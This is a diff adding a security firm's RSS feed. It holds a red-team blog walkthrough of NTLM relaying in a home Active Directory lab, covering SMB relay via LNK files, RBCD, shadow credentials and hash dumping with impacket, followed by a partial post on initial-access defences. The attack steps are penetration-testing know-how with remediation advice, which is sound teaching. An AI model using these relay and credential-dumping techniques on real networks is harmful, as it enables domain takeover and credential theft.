@@ -1,0 +1,1246 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>JUMPSEC – Red-Teaming</title>
+    <link>//localhost:1313/categories/red-teaming/</link>
+    <description>Recent content in Red-Teaming on JUMPSEC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-GB</language>
+    <lastBuildDate>Tue, 17 Sep 2024 00:00:00 +0000</lastBuildDate>
+    
+	  <atom:link href="//localhost:1313/categories/red-teaming/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+        
+      
+    
+    
+    <item>
+      <title>NTLM Relaying - Making the Old New Again</title>
+      <link>//localhost:1313/articles/2024/09/2024-09-17-ntlm-relaying-making-the-old-new-again/</link>
+      <pubDate>Tue, 17 Sep 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2024/09/2024-09-17-ntlm-relaying-making-the-old-new-again/</guid>
+      <description>
+        
+        
+        &lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/davesbloggie.gif&#34; title=&#34;davesbloggie&#34; alt=&#34;davesbloggie&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;davesbloggie&lt;/figcaption&gt;
+  &lt;/figure&gt;I am old enough to remember that it was not always possible to get domain admin within the first hour of a test via Active Directory Certificate Services (ADCS) misconfigurations or over permissioned SCCM NAA accounts. At present we are spoilt for choice in regards to privilege escalation vectors within the on-premise AD environment&amp;rsquo;s, but I wanted to take a look at some of the other misconfigurations that proved to be fruitful before the advent of ADCS and SCCM and continue to land me quick wins on engagements, such as:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Lack of SMB signing&lt;/li&gt;
+&lt;li&gt;Lack of LDAP signing and/or channel binding&lt;/li&gt;
+&lt;li&gt;Machine Account Quota &amp;gt; 0&lt;/li&gt;
+&lt;li&gt;NTLM relaying&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The undelaying exploits are not new here, only the old revisited, but just maybe some of the modern techniques for abusing them have slipped your mind in the rush to abuse ESC1. These techniques should be part of your on-premise AD toolkit, so let&amp;rsquo;s jump into the details.&lt;/p&gt;
+&lt;p&gt;Below is a diagram of my very basic KENNEDY.local home domain setup consisting of:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;1x Windows Server acting as Domain Controller: KENNEDY-DC (192.168.0.137)&lt;/li&gt;
+&lt;li&gt;1x Windows Server acting as Certificate Authority: KENNEDY-CA (192.168.0.84)&lt;/li&gt;
+&lt;li&gt;1x Windows 10 Workstation: ELISH (192.168.0.99)&lt;/li&gt;
+&lt;li&gt;1x Kali VM acting as Attacker (192.168.0.203)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/1.png&#34; title=&#34;1&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The users will be:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;jkennedy (standard domain user)&lt;/li&gt;
+&lt;li&gt;ekennedy (administrative user)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;strong&gt;Lack of SMB Signing&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;lack-of-smb-signing&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lack-of-smb-signing&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Nothing illustrates the power of the SMB signing vulnerability quite like LNK files placed on shares. My favourite tool for demonstrating this, is the ‘slinky’ module on ‘&lt;a href=&#34;https://github.com/Pennyw0rth/NetExec&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;nxc&lt;/a&gt;’.&lt;/p&gt;
+&lt;p&gt;You can build up a list of all the machines with SMB signing as ‘false’ with the following command:&lt;/p&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;nxc smb targets.txt --gen-relay-list nosigning.txt&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;But in my small lab I can just manually check the machines like so:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/2-1.png&#34; title=&#34;2 1&#34; alt=&#34;2 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;2 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We can see above that the ELISH machine has no signing so it won’t be able to identify for sure who is authenticating to it over the SMB protocol.&lt;/p&gt;
+&lt;p&gt;With that in mind we first use nxc to analyse the KENNEDY-CA machine to see if we have any available writable directories for us to place our LNK file and it identifies the ‘share’ directory:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/3-1.png&#34; title=&#34;3 1&#34; alt=&#34;3 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;3 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We then use slinky to create a LNK file on this share which points back to our Kali VM 192.168.0.203. Now when anyone enters that share via file explorer (not command line) and without even clicking it the LNK file will be triggered and their authentication will be sent back to the attackers Kali machine.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/4-1.png&#34; title=&#34;4 1&#34; alt=&#34;4 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;4 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Back at the attackers Kali machine we set up a &lt;a href=&#34;https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ntlmrelayx&lt;/a&gt; listener for any authentications coming in and, if any are received, we target the 192.168.0.99 machine where we know signing is disabled. At that point ntlmrelayx can automatically open a socks connection with that machine as the user who entered the share using their authentication. We are essentially carrying out a man in the middle attack.&lt;/p&gt;
+&lt;p&gt; &lt;figure&gt;
+    &lt;img src=&#34;images/5-1.png&#34; title=&#34;5 1&#34; alt=&#34;5 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;5 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;When the authentication comes in after ‘ekennedy’ enters the share, we get a hit, and a socks connection is opened with the 192.168.0.99 machine that has no signing as shown:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/6-1.png&#34; title=&#34;6 1&#34; alt=&#34;6 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;6 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;A persistent socks connection is then maintained within ntlmrelayx which is visible when you enter the ‘socks’ command as shown:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/7-1.png&#34; title=&#34;7 1&#34; alt=&#34;7 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;7 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We can then edit our proxychains configuration file to allow us to access this socks connection to the remote machine, which uses port 1080 by default:&lt;/p&gt;
+&lt;p&gt;In ‘/etc/proxychains4.conf’ add the line “socks4 127.0.0.1 1080”&lt;/p&gt;
+&lt;p&gt;Now using proxychains we can dump the sam data given that the ‘ekennedy’ authentication was of an Administrator. It should be noted we don’t need a password at this point using nxc, given we are using a live socks tunnel which has already been authenticated over NTLM.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/8-2.png&#34; title=&#34;8 2&#34; alt=&#34;8 2&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;8 2&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Taking complete control of this machine is now trivial with the hashes received. In the above scenario, ntlmrelayx was used to relay the ‘ekennedy’ admin authentication to just 1 machine but in practice it could relay it to 50 machines with SMB signing off, therefore opening up 50 admin socks connections to pick and choose from.&lt;/p&gt;
+&lt;p&gt;This most certainly has happened to me on a real test.&lt;/p&gt;
+&lt;p&gt;Next up are 2 techniques that rely less on luck, especially if you are impatient waiting for someone to trigger a LNK file.&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;LDAP Signing - RBCD&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;ldap-signing---rbcd&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#ldap-signing---rbcd&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Similar to SMB signing, LDAP signing - or the lack there of - allows attackers to send HTTP authentication to the LDAP service available on a Domain Controller (DC) but, because signing is disabled, the DC is unable to verify that the authentication coming in is from the actual machine that sent it. This, once again, opens up the possibility of MiTM attacks.&lt;/p&gt;
+&lt;p&gt;First we check the ‘KENNEDY-DC’ machine to see if LDAP signing or channel binding is enforced, which it isn’t.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/9.png&#34; title=&#34;9&#34; alt=&#34;9&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;9&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We then search for a machine that has a WebClient running on the network using nxc’s &amp;lsquo;webdav&amp;rsquo; module as shown below, and we can see that the ‘KENNEDY-CA’ machine has it enabled. Why are we interested in webdav? Well, we can coerce the WebClient service to authenticate back to us over HTTP:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/10.png&#34; title=&#34;10&#34; alt=&#34;10&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;10&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;From our attacker’s Kali machine, we now launch ntlmrelayx to target LDAPS of ‘KENNEDY-DC’ and when doing so to use the the ‘delegate access’ flag  to launch a RBCD attack on that machine.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/11.png&#34; title=&#34;11&#34; alt=&#34;11&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;11&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;In simple terms what delegate access does is create a new machine on the network and gives the new machine permissions over the machine whose authentication we have passed to the DC. These permissions allow us, as the attacker, to impersonate anyone else on the machine (e.g. an administrator).&lt;/p&gt;
+&lt;p&gt;To now force the WebClient to authenticate to ntlmrelayx, we first launch &lt;a href=&#34;https://github.com/lgandx/Responder&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Responder&lt;/a&gt;. Ensure its HTTP and SMB servers are turned off, as we don’t want to catch the authentication with this tool but instead using ntlmrelayx.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/12.png&#34; title=&#34;12&#34; alt=&#34;12&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;12&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The only reason we use Responder is to provide us with a ‘Machine Name’ on the network that we can use to advertise itself and receive authentications into our Kali machine. This machine name can be seen below:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/13.png&#34; title=&#34;13&#34; alt=&#34;13&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;13&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We now coerce the ‘KENNEDY-CA’ (192.168.0.84) machine to authenticate to our attacker Kali Responder machine over HTTP, then relay that authentication to ‘KENNEDY-DC’, which will be unable to verify who is authenticating to it. The call back to our Responder machine instead hits our ntlmrelayx server, listening on port 80:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/14.png&#34; title=&#34;14&#34; alt=&#34;14&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;14&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;After executing that command, ntlmrelayx forwards the authentication to ‘KENNEDY-DC’ with LDAP signing disabled, and we receive a new machine on the network with a random name, called ‘KQCLXPVT$’. This new machine will also present added information required to impersonate users on the ‘KENNEDY-CA’ server.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/15.png&#34; title=&#34;15&#34; alt=&#34;15&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;15&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This new machine can now be seen in Active Directory as shown:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/16.png&#34; title=&#34;16&#34; alt=&#34;16&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;16&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Using the module named ‘group-mem’ that I wrote for nxc we can now see who we would like to impersonate by looking up the privileged ‘Domain Admins’ members:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/17.png&#34; title=&#34;17&#34; alt=&#34;17&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;17&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;After choosing ‘ekennedy’ we can now impersonate them by using our new machine account username and password via the getST.py command from impacket.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/18.png&#34; title=&#34;18&#34; alt=&#34;18&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;18&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This will provide us an ‘ekennedy’ service ticket (a.k.a. silver ticket) for the cifs service on that specific machine, which can’t be used elsewhere.&lt;/p&gt;
+&lt;p&gt;We can import this into our Kali memory as so:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/19.png&#34; title=&#34;19&#34; alt=&#34;19&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;19&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We can then use this ticket in various tools by specifying the ‘-k’ flag on the command line, so it will grab the ticket directly from that KRB5CCNAME variable we set.&lt;/p&gt;
+&lt;p&gt;Here I use &lt;a href=&#34;https://github.com/fortra/impacket/blob/master/examples/secretsdump.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;secretsdump&lt;/a&gt; to now dump the hashes from the machines memory which, like passwords, we can use to access the machine as an Administrator, for example:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/20.png&#34; title=&#34;20&#34; alt=&#34;20&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;20&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;LDAP Signing - Shadow Credentials&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;ldap-signing---shadow-credentials&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#ldap-signing---shadow-credentials&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This technique is very very similar to the previous one so I will cover it in less detail. The key benefit to using this one is that it isn’t reliant on creating a new machine on the network, which can be useful when some organisations have the ‘Machine Account Quota’ set to zero. Remember that, by default,  regular AD users are allowed to add 10, which is crazy!&lt;/p&gt;
+&lt;p&gt;This technique allows an attacker to take over an AD computer account if we can modify the computer’s attribute ‘msDS-KeyCredentialLink’ and append it with alternate credentials in the form of a certificate which we have control over. This certificate will then allow us to have control over that machine.&lt;/p&gt;
+&lt;p&gt;So once again we set up our trusty ntlmrelayx to target ‘KENNEDY-DC’ with no LDAP signing in place but specifying two different flags. They are shadow credentials to tell it what attack we are doing, then a shadow-target to specify the machine we are targeting. The machine we are targeting in this case is again the ‘KENNEDY-CA’ machine with the WebClient running, so we can coerce it towards us as shown previously.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/22.png&#34; title=&#34;22&#34; alt=&#34;22&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;22&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;We again use Responder to provide a machine name and &lt;a href=&#34;https://github.com/topotam/PetitPotam&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PetitPotam&lt;/a&gt; to carry out the coercion back to us as shown:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/23.png&#34; title=&#34;23&#34; alt=&#34;23&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;23&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Once again ntlmrelayx gets a hit but this time instead of being able to impersonate anybody else on the victim machine we receive a certificate for the machine account.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/24.png&#34; title=&#34;24&#34; alt=&#34;24&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;24&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Quite handily above, ntlmrelayx provides the command to use next with the tool &lt;a href=&#34;https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;gettgtpkinit.py&lt;/a&gt; to convert the certificate into a TGT (Ticket Granting Ticket) for the machine. A TGT is just as good as a username and password in the Kerberos world so we can use that to act as the machine we are attacking.&lt;/p&gt;
+&lt;p&gt;After running that command the TGT is saved to file:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/25.png&#34; title=&#34;25&#34; alt=&#34;25&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;25&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Once again we import it into our variable to be used by our tools:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/26.png&#34; title=&#34;26&#34; alt=&#34;26&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;26&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Then once again run secretsdump with the ‘-k’ flag to use the TGT to dump all the hashes of the machine, allowing us a complete takeover.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/27.png&#34; title=&#34;27&#34; alt=&#34;27&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;27&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Well, that completes my little foray into some of the older adversary techniques that have helped me compromise countless Active Directory environments. Whilst older, these are still very real-world and usable attack paths so hopefully this provides the testers out there with some added insights and the defenders with some visibility over attack paths adversaries may take in their Active Directory domains.&lt;/p&gt;
+&lt;p&gt;Some remediation steps that you can take to hinder these attacks in your domain are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Enabling SMB signing&lt;/li&gt;
+&lt;li&gt;Enabling LDAP signing&lt;/li&gt;
+&lt;li&gt;Set the ‘Machine Account Quota’ to zero&lt;/li&gt;
+&lt;li&gt;Try to move away from NTLM to Kerberos&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Until next time.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Adversary at the Door - Initial Access and what&#39;s currently on the menu</title>
+      <link>//localhost:1313/articles/2024/08/2024-08-20-adversary-at-the-door-initial-access-and-whats-currently-on-the-menu/</link>
+      <pubDate>Tue, 20 Aug 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2024/08/2024-08-20-adversary-at-the-door-initial-access-and-whats-currently-on-the-menu/</guid>
+      <description>
+        
+        
+        &lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/wolf-in-sheep-clothes-1.png&#34; title=&#34;wolf in sheep clothes 1&#34; alt=&#34;wolf in sheep clothes 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;wolf in sheep clothes 1&lt;/figcaption&gt;
+  &lt;/figure&gt;Based on the data from the &lt;a href=&#34;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Cyber Security Breaches Survey 2024&lt;/a&gt;, phishing with malicious links or malware remains the most common initial access vector, followed by impersonation. The challenge with impersonation attacks is that current technology often struggles to accurately determine the purpose of a website. Although checks on domain maturity, reputation, categorization, and certificates are performed, a skilled adversary can still create sophisticated phishing infrastructure that hosts malware. This allows them to establish a foothold within a network and gain initial access, despite various defences.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://attack.mitre.org/tactics/TA0108/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Initial access&lt;/a&gt; is a set of techniques that exploit different entry points to gain an initial foothold in an organisation&amp;rsquo;s network. There are several initial access techniques that can include various social engineering methodologies and exploitation methods, for example misconfigured web servers i.e. instance of Apache Tomcat or exposed management services, i.e. Remote Desktop Protocol on port 3389. It can also include a trusted third party compromise where direct access is gained from captured credentials or a device.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image8&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 1: Visual representation of cyber kill chain.&lt;/p&gt;
+&lt;p&gt;The initial exploitation can be long-term or limited based on the method of entry and reason for exploitation. Once the adversary gets a foothold within the network, the attack execution is carried out, where the adversary tries to run malicious code, explore the network, or steal confidential data. This in itself has also become a lucrative business, as IAB&amp;rsquo;s (Initial Access Brokers) have specialised in doing just that, gaining the access to the networks and then selling it to other threat actors as it becomes significantly harder from year to year.&lt;/p&gt;
+&lt;p&gt;Fortunately, there are safeguards in place that protect organisations and users from adversaries, making initial access significantly more challenging when a defense-in-depth strategy is properly implemented. This is a stark contrast to the threat landscape of 10-15 years ago. Also on the other side, we frequently hear major news about vulnerabilities, bypasses, and exploitation of these control technologies that are our very . For example, just last week, a Windows SmartScreen vulnerability was discovered and exploited to deploy malware in the wild, as reported in this &lt;a href=&#34;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;article&lt;/a&gt;.&lt;/p&gt;
+&lt;h1&gt;What prevents Initial Access?&lt;/h1&gt;&lt;p&gt;As previously mentioned, adversaries now face significant challenges in gaining initial access to systems and networks. These challenges arise from a multi-layered cybersecurity approach that employs advanced technologies and best practices. Given that most of our clients at JUMPSEC rely on Windows and Active Directory, I&amp;rsquo;ll highlight technology examples specific to that environment.&lt;/p&gt;
+&lt;p&gt;Here are some key technologies that effectively thwart less sophisticated initial access attempts:&lt;/p&gt;
+&lt;h3&gt;Windows SmartScreen&lt;span class=&#34;absolute -mt-20&#34; id=&#34;windows-smartscreen&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#windows-smartscreen&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image7&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 2: Upon execution of an unknown binary, SmartScreen popup will appear.&lt;/p&gt;
+&lt;p&gt;Windows SmartScreen was originally launched with Windows 8, which was released on October 26, 2012, and is intended to protect users from numerous online risks and has been proven to be effective against less sophisticated adversaries. It works by checking the following upon execution:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Is the signature of that binary a known malware&lt;/li&gt;
+&lt;li&gt;Is the binary signed&lt;/li&gt;
+&lt;li&gt;Is the certificate signing authority known and trusted by Microsoft&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;SmartScreen will display a warning before allowing it to run and potentially detect and prevent malware being run on the system.&lt;/p&gt;
+&lt;p&gt;Adversaries employ various methods to bypass these measures. One such tactic involves exploiting Windows&amp;rsquo; inherent trust in binaries - wink wink DLL Side Loading, but delving into this topic merits another blog post. In contrast to SmartScreen, which primarily assesses the reputation of the entry point program, Windows 11’s Smart App Control takes a more comprehensive approach. It verifies the integrity and digital signatures of all code (including DLLs, scripts, etc.) loaded by the Windows OS Loader and script engines to enhance security measures.&lt;/p&gt;
+&lt;h3&gt;Signature verification&lt;span class=&#34;absolute -mt-20&#34; id=&#34;signature-verification&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#signature-verification&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Microsoft&amp;rsquo;s Authenticode technology allows software publishers to use X.509 code-signing certificates to sign their software. These certificates verify the identity of the software publisher to ensure that the software remains unchanged since it was signed by the original issuer.&lt;/p&gt;
+&lt;p&gt;Microsoft does not verify the publisher&amp;rsquo;s identity or the integrity of the code directly. Instead, it relies on a robust Public Key Cryptography (PKI) system which enables a third-party certificate authority, such as Sectigo (formerly Comodo CA), to authenticate the publisher and hash the code.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image13.png&#34; title=&#34;image13&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image13&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 3: UAC Prompt will notify users in both cases where the publisher is known and unknown.&lt;/p&gt;
+&lt;p&gt;With Microsoft Authenticode, various types of Windows executables and code can be signed, including &lt;em&gt;.exe&lt;/em&gt;, &lt;em&gt;.cab&lt;/em&gt;, &lt;em&gt;.dll&lt;/em&gt;, &lt;em&gt;.ocx&lt;/em&gt;, and &lt;em&gt;.xpi&lt;/em&gt; files, in both 32-bit and 64-bit user modes.&lt;/p&gt;
+&lt;p&gt;Authenticode certificates are used to verify and hash both software or code developed by a publisher. Although the certificates are issued by Microsoft, the validation and hashing processes are conducted by a trusted certificate authority (CA) like Sectigo. This ensures that the code comes from a verified source and remains unchanged since its release. Unfortunately, it has been discovered that adversaries are abusing signature verification, as discovered by (&lt;a href=&#34;https://symantec-enterprise-blogs.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://symantec-enterprise-blogs.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse&lt;/a&gt;). The APT called Carderbee was able to get Microsoft to digitally sign a type of malware known as a rootkit. To gain that level of access without alerting end-point security systems and other defences, the Carderbee hackers required their rootkit to receive Microsoft approval, which it did after Microsoft signed it.&lt;/p&gt;
+&lt;h3&gt;Application Allowlisting and Blocklisting&lt;span class=&#34;absolute -mt-20&#34; id=&#34;application-allowlisting-and-blocklisting&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#application-allowlisting-and-blocklisting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image12.png&#34; title=&#34;image12&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image12&lt;/figcaption&gt;
+  &lt;/figure&gt; Figure 4: Applocker Popup.&lt;/p&gt;
+&lt;p&gt;Application allowlisting ensures that only authorised software can execute, while blocking all unauthorised software from running on your assets. This prevents malicious or unapproved applications from potentially compromising the system. The application allowlisting software must verify that only authorised software libraries (such as &lt;em&gt;.dll,&lt;/em&gt; .ocx, etc.) are permitted to load into system processes. This helps to maintain the integrity of your system by preventing unauthorised code from being injected.&lt;/p&gt;
+&lt;p&gt;In Windows environments, specifically in Active Directory we can utilise group policies, Applocker or something stricter like Windows Defender Application Control to maintain and enforce control policies over applications and binaries.&lt;/p&gt;
